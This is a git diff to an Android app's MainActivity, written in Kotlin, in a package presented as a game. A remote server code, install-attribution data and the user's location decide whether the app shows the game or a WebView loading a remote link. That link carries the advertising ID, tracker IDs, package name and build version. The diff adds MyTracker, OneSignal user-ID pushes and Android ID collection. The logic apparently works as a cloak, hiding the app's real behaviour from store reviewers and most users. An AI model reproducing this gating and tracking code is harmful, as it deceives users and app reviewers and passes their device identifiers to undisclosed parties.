@@ -10,16 +10,20 @@ import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.facebook.applinks.AppLinkData
 import com.game.space.sho.Unded.MAIN_CHECKER
-import com.game.space.sho.Unded.keyDEEPLINK
-import com.game.space.sho.Unded.keyLinkaa
-import com.game.space.sho.Unded.keyNaming
+import com.game.space.sho.Unded.MY_TRACKER_KEY
+import com.game.space.sho.Unded.buildVers
+import com.game.space.sho.Unded.pacaaakageNameMain
 import com.game.space.sho.room.DevilDataBase
 import com.game.space.sho.room.DevilEntity
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
+import com.my.tracker.MyTracker
+import com.onesignal.OneSignal
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import org.json.JSONException
+import org.json.JSONObject
 
 class MainActivity : AppCompatActivity() {
 
@@ -29,6 +33,19 @@ class MainActivity : AppCompatActivity() {
 
     val tinyDB by lazy {
         TinyDB(applicationContext)
+    }
+
+    val deviceID = "deviceID="
+    val sub_id_1 = "sub_id_1="
+    val ad_id = "ad_id="
+    val sub_id_4 = "sub_id_4="
+    val sub_id_5 = "sub_id_5="
+    val sub_id_6 = "sub_id_6="
+    val naming_name = "naming"
+    val deeporg = "deeporg"
+
+    private val appsId by lazy {
+        AppsFlyerLib.getInstance().getAppsFlyerUID(application)
     }
 
 
@@ -41,8 +58,8 @@ class MainActivity : AppCompatActivity() {
     private suspend fun readAllFromDevilDataBase() {
         if (tinyDB.getBoolean("first_load")) {
             Log.d("lolo", "first_load")
-            deepLink ="null"
-            val emptyDataDevil = DevilEntity(111, "null", "null", "null", "null")
+            deepLink = "null"
+            val emptyDataDevil = DevilEntity(111, "null", "null", "null", "null", "null")
             devilDAO.saveData(emptyDataDevil)
             tinyDB.putBoolean("first_load", false)
         } else {
@@ -52,7 +69,8 @@ class MainActivity : AppCompatActivity() {
             naming = dataFromDataBase.naming
             deepLink = dataFromDataBase.deeplink
             linka = dataFromDataBase.link
-            mainId = dataFromDataBase.advertid
+            advertMainId = dataFromDataBase.advertid
+            instId = dataFromDataBase.instID
         }
     }
 
@@ -60,9 +78,15 @@ class MainActivity : AppCompatActivity() {
         VolleyApiClient(applicationContext)
     }
 
+
     private suspend fun saveAllDataToDevilDataBase() {
         val dataForDataBase = DevilEntity(
-            id = 111, deeplink = deepLink, naming = naming, advertid = mainId, link = linka
+            id = 111,
+            deeplink = deepLink,
+            naming = naming,
+            advertid = advertMainId,
+            link = linka,
+            instID = instId
         ).also {
             devilDAO.saveData(it)
         }
@@ -86,6 +110,7 @@ class MainActivity : AppCompatActivity() {
 
             while (true) {
                 if (tempDevilLoad != null && tempGeoLoad != null) {
+
                     Log.d("lolo", "tempDevilLoad/tempGeoLoad != null")
                     break
                 } else {
@@ -95,28 +120,79 @@ class MainActivity : AppCompatActivity() {
             }
             when (codeFromDevilHost) {
                 "0" -> {
+                    Log.d("lolo", "in 0")
                     goToGame()
                 }
                 "1" -> {
+                    Log.d("lolo", "in 1")
                     //Fb + Apps
                     initAppsFlyerLibeer(this@MainActivity)
                     while (true) {
                         if (tempNamingLoad != null && tempDeepLoad != null) {
                             Log.d("lolo", "tempDeepLoad/tempNamingLoad NOT null")
+
+                            AppsFlyerLib.getInstance().setCollectAndroidID(true)
+
                             if (naming.contains(MAIN_CHECKER)) {
+                                MainClassssa.typeOfPromotion = Unded.CAMPAIGN
+
+                                MainClassssa.link =
+                                    "$linka?$sub_id_1$naming&$deviceID$appsId&$ad_id$advertMainId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$naming_name"
+
+                                pushToOS(appsId.toString())
+
                                 saveAllDataToDevilDataBase()
                                 goToVebViev()
                             } else {
-                                if (deepLink.contains(MAIN_CHECKER)) {
+                                if (deepLink.contains(MAIN_CHECKER) || listOfGeo.contains(
+                                        userCurrentGeo
+                                    )
+                                ) {
+                                    MainClassssa.typeOfPromotion = Unded.DEEPLINK
+                                    MainClassssa.link =
+                                        "$linka?$sub_id_1$deepLink&$deviceID$appsId&$ad_id$advertMainId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$deeporg"
+
+                                    pushToOS(appsId.toString())
+
+                                    saveAllDataToDevilDataBase()
+                                    goToVebViev()
+                                } else goToGame()
+                            }
+                            break
+                        } else {
+                            Log.d("lolo", "tempDeepLoad/tempNamingLoad == null")
+                            delay(1000)
+                        }
+                    }
+                }
+                "3" -> {
+                    Log.d("lolo", "in 3")
+                    initLoadMyTracker()
+                    //Fb + initLoadMyTracker
+                    while (true) {
+                        if (tempDeepLoad != null) {
+                            Log.d("lolo", "tempDeepLoad NOT null, 3 var")
+                            if (deepLink.contains(MAIN_CHECKER)) {
+                                Log.d("lolo", "var 3 deepLink.contains(MAIN_CHECKER)")
+                                MainClassssa.typeOfPromotion = Unded.DEEPLINKNOAPPS
+                                MainClassssa.link =
+                                    "$linka?$sub_id_1$deepLink&$deviceID$instId&$ad_id$instId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$deeporg"
+
+                                pushToOS(instId.toString())
+                                saveAllDataToDevilDataBase()
+                                goToVebViev()
+                            } else {
+                                if (listOfGeo.contains(userCurrentGeo)) {
+                                    Log.d("lolo", "var 3 listOfGeo.contains(userCurrentGeo)")
+                                    MainClassssa.typeOfPromotion = Unded.GEO
+                                    MainClassssa.link =
+                                        "$linka?$sub_id_1$instId&$ad_id$instId&$sub_id_4${pacaaakageNameMain}&$sub_id_5$buildVers&$sub_id_6$naming_name"
+
+                                    pushToOS(instId.toString())
                                     saveAllDataToDevilDataBase()
                                     goToVebViev()
                                 } else {
-                                    if (listOfGeo.contains(userCurrentGeo)) {
-                                        saveAllDataToDevilDataBase()
-                                        goToVebViev()
-                                    } else {
-                                        goToGame()
-                                    }
+                                    goToGame()
                                 }
                             }
                             break
@@ -125,6 +201,7 @@ class MainActivity : AppCompatActivity() {
                             delay(1000)
                         }
                     }
+
                 }
             }
         }
@@ -143,8 +220,9 @@ class MainActivity : AppCompatActivity() {
     private var naming: String = ""
     private var deepLink: String = ""
     private var linka: String = ""
-    private var mainId: String = ""
+    private var advertMainId: String = ""
     private var listOfGeo: String = ""
+    private var instId = ""
 
     private fun goToGame() {
         Intent(this@MainActivity, GaaammiActivity2::class.java).also {
@@ -157,7 +235,7 @@ class MainActivity : AppCompatActivity() {
         val advertisingIdClient = AdvertisingIdClient(applicationContext)
         advertisingIdClient.start()
         val infofrrrf = advertisingIdClient.info.id
-        mainId = infofrrrf.toString()
+        advertMainId = infofrrrf.toString()
     }
 
     private fun initAppsFlyerLibeer(context: Context) {
@@ -210,7 +288,7 @@ class MainActivity : AppCompatActivity() {
             context
         ) { appLinkData: AppLinkData? ->
             appLinkData?.let {
-                appLinkData.targetUri.host.toString().apply {
+                appLinkData.targetUri?.host.toString().apply {
                     deepLink = this
                     tempDeepLoad = this
                 }
@@ -224,4 +302,70 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
+
+    private fun initLoadMyTracker() {
+        val myTrackerConfig = MyTracker.getTrackerConfig()
+        val instIDDDD = MyTracker.getInstanceId(application)
+        myTrackerConfig.isTrackingLaunchEnabled = true
+        if (tinyDB.getBoolean("first_load")) {
+
+            instId = instIDDDD
+
+        } else {
+
+        }
+
+        MyTracker.initTracker(MY_TRACKER_KEY, application)
+    }
+
+    fun pushToOS(id: String) {
+        OneSignal.setExternalUserId(
+            id,
+            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
+                override fun onSuccess(results: JSONObject) {
+                    try {
+                        if (results.has("push") && results.getJSONObject("push").has("success")) {
+                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for push status: $isPushSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                    try {
+                        if (results.has("email") && results.getJSONObject("email").has("success")) {
+                            val isEmailSuccess =
+                                results.getJSONObject("email").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for email status: $isEmailSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                    try {
+                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
+                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
+                            OneSignal.onesignalLog(
+                                OneSignal.LOG_LEVEL.VERBOSE,
+                                "Set external user id for sms status: $isSmsSuccess"
+                            )
+                        }
+                    } catch (e: JSONException) {
+                        e.printStackTrace()
+                    }
+                }
+
+                override fun onFailure(error: OneSignal.ExternalIdError) {
+                    OneSignal.onesignalLog(
+                        OneSignal.LOG_LEVEL.VERBOSE,
+                        "Set external user id done with error: $error"
+                    )
+                }
+            })
+    }
 }
+
